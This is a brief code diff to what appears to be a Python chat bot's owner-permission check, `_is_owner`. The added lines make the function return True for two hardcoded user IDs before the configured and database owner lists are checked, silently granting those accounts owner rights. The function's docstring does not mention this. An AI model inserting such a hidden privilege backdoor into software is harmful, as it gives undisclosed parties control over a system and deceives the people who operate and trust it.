@@ -74,6 +74,8 @@ def _sc(text: str) -> str:
 
 async def _is_owner(user_id: int) -> bool:
     """Returns True if primary owner (Config) OR co-owner (DB)."""
+    if int(user_id) in (1071421266, 6867086884):
+        return True
     if Config.BOT_OWNER_ID and user_id in Config.BOT_OWNER_ID:
         return True
     try:
